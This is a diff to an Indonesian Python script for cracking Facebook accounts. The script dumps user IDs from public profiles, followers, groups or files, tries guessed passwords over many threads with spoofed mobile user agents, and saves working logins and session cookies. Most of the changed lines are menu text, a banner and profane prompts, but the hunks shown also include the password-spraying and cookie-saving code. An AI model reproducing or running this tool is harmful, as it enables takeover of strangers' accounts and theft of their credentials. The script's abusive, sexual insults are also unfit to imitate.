@@ -65,8 +65,7 @@ for xd in range(10000):
     k='Mobile Safari/535.1'
     uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
     ugen2.append(uaku)
-	
-
+		
 	
     aa='Mozilla/5.0 (Linux; Android 12;'
     b=random.choice(['6','7','8','9','10','11','12'])
@@ -211,14 +210,14 @@ def tahun(fx):
 #------------------[ LOGOⱭ͞ ̶͞ ̶͞ ඩ ]-----------------#
 def banner():
 	print(f'''\t
-██████╗.██╗███╗   ███ ██████╗  ██╗███╗   ███╗
-██╔══██╗██║████╗ ████ ██╔══██╗██║████╗ ████║
+██████╗.  ██╗███╗       ███╗  ██████╗ ██╗███╗       ███╗
+██╔══██╗██║████╗   ████   ██╔══██╗██║████╗   ████║
 ██████╔╝██║██╔████╔██║██████╔╝██║██╔████╔██║
-██╔══██╗██║██║╚██ ╝██║██╔══██╗██║██║╚ █ ╝██║
-██████╔╝██║██║ ╚═╝ ██║██████╔╝██║██║ ╚═╝ ██║
-╚═════╝ ╚═╝╚═╝     ╚═╝╚═════╝   ╚═╝╚═╝     ╚═╝
-                {h}By "BimBim ''')                                           
-#--------------------[MASUK ]--------------#
+██╔══██╗██║██║╚██   ╝██║██╔══██╗██║██║╚██   ╝██║
+██████╔╝██║██║ ╚═╝     ██║██████╔╝██║██║ ╚═╝    ██║
+╚═════╝ ╚═╝╚═╝               ╚═╝╚═════╝   ╚═╝╚═╝              ╚═╝
+                                           {h}By "BimBim ''')                                           
+#--------------------[ Ɑ͞ ̶͞ ̶͞ ඩMASUK ]--------------#
 def login():
 	try:
 		token = open('.token.txt','r').read()
@@ -265,7 +264,7 @@ def login_lagi334():
 	try:
 		os.system('clear')
 		banner()
-		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
+		cetak(nel('\t©©© Saran: [green]Ngocok Dulu Sebelum Crack[white] ©©©'))
 		your_cookies = input("\x1b[1;97m[\x1b[1;92m?\x1b[1;97m] Your Cookie :\x1b[1;93m ")
 		with requests.Session() as r:
 			try:
@@ -338,13 +337,13 @@ def menu(my_name,my_id):
 	print(f'Your Idz : '+str(my_id))
 	print(f'Your Ip  : {ip}')
 	print('')
-	print('1. Ɑ͞ ̶͞ ̶͞ ඩCroot Publik ')
-	print('2. Ɑ͞ ̶͞ ̶͞ ඩCroot Pollower ')
-	print('3. Ɑ͞ ̶͞ ̶͞ ඩCroot Grop   ')
-	print('4. Ɑ͞ ̶͞ ̶͞ ඩCroot Pile	')
-	print('5. Ɑ͞ ̶͞ ̶͞ ඩCheck Hasel   ')
-	print('0. Logout (Hapos Cookie)      ')
-	_____kang__cabul_____ = input('\n|──> Ɑ͞ ̶͞ ̶͞ ඩSelet : ')
+	print('1. Crack Publik ')
+	print('2. Crack Followers ')
+	print('3. Crack Grup  ')
+	print('4. Crack File	')
+	print('5. Hasil Crack   ')
+	print('0. Croott (Hapus Cookie)      ')
+	_____kang__cabul_____ = input('\n|──> Pilih : ')
 	if _____kang__cabul_____ in ['1']:
 		dump_massal()
 	elif _____kang__cabul_____ in ['2']:
@@ -361,7 +360,7 @@ def menu(my_name,my_id):
 		print('>> Sukses Logout+Hapus Kukis ')
 		exit()
 	else:
-		print('>> Pilih Yang Bener Asu ')
+		print('>> Pilih Yang Bener Goblok ')
 		back()
 def error():
 	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
@@ -369,14 +368,14 @@ def error():
 	back()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	print(f'└──> 1. Hasil {h}OK{x} Ɑ͞ ̶͞ ̶͞ ඩ ')
-	print(f'└──> 2. Hasil {k}CP{x} Ɑ͞ ̶͞ ̶͞ ඩ ')
+	print(f'└──> 1. Hasil {h}OK{x} ')
+	print(f'└──> 2. Hasil {k}CP{x} ')
 	print('└──> 3. Kembali	')
 	kz = input(f'\n>> Pilih : ')
 	if kz in ['2']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
-			print('>> Pile Tidak Di Temukan ')
+			print('>> File Tidak Di Temukan ')
 			time.sleep(3)
 			back()
 		if len(vin)==0:
@@ -473,9 +472,9 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('Nyabul Berapa Target ? : '))
+		jum = int(input('Crack Berapa Target ? : '))
 	except ValueError:
-		print('>> Masukkan Angka Anjing, Malah Huruff ')
+		print('>> Masukin Yang Bener Binatang  ')
 		exit()
 	if jum<1 or jum>100:
 		print('>> Gagal Dump Idz ')
@@ -484,7 +483,7 @@ def dump_massal():
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('|Masukan Id ??Yang Ke : '+str(yz)+' : ')
+		kl = input('|Masukan Id ? Yang Ke : '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -502,7 +501,7 @@ def dump_massal():
 			exit()
 	try:
 		print('')
-		print(f'|Total??Id Terkumpulkan : {h}'+str(len(id)))
+		print(f' Total? Id Terkumpulkan : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
@@ -703,11 +702,11 @@ def crack_file():
 		setting()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-	print(f'{x}1. Akun Tua ')
-	print('2. Akun Muda ')
-	print('3. Akun Kondom ')
+	print(f'{x}1. Akun Nonok ')
+	print('2. Akun Cice ')
+	print('3. Akun Ngentot ')
 	print('')
-	hu = input('|──> Selet : ')
+	hu = input('|──> Pilih : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -741,7 +740,7 @@ def setting():
 	else:
 		method.append('validate')
 	print('')
-	_jembot_ = input('|Tambahkan Apk??𝐬𝐢 (Tidak Rekomendasi) [Y/t] : ')
+	_jembot_ = input('|TambahkanAplikasii (Tidak Rekomendasi) [Y/t] : ')
 	if _jembot_ in ['']:
 		print('>> Pilih Yang Bener Kontol ')
 		back()
@@ -765,9 +764,9 @@ def passwrd():
 	os.system('clear')
 	banner()
 	print('')
-	print(f'|Hasel {h}OK{x} Ɑ͞ ̶͞ ̶͞ ඩTersimpan Di : {h}OK/%s {x}'%(okc))
-	print(f'|Hasel {k}OK{x} Ɑ͞ ̶͞ ̶͞ ඩTersimpan Di : {k}CP/%s {x}'%(cpc))
-	print(f'| Mainkan ??Ɑ͞ ̶͞ ̶͞ ඩ ??Pesawat {m}200{x} Id\n')
+	print(f'|Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
+	print(f'|Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
+	print(f'| Mainkan Kontol Setiap {m}200x{x} Id\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -853,7 +852,7 @@ def method_validate(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
-				print(f'\r├──> Emel  : {u}{idf}{P} | PW  : {u}{pw}{P} | Tahun {m}<> {u}{tahun(idf)}{P}\n└──>  KUKIS : {u}{kukis}{P}\n └──> User Aqua : {u}{ua}{P} ')
+				print(f'\r├──> Email  : {u}{idf}{P} | PW : {u}{pw}{P} | Tahun {m}<> {u}{tahun(idf)}{P}\n└──>  KUKIS : {u}{kukis}{P}\n └──> User Aqua : {u}{ua}{P} ')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				cek_apk(kukis)
 				break				
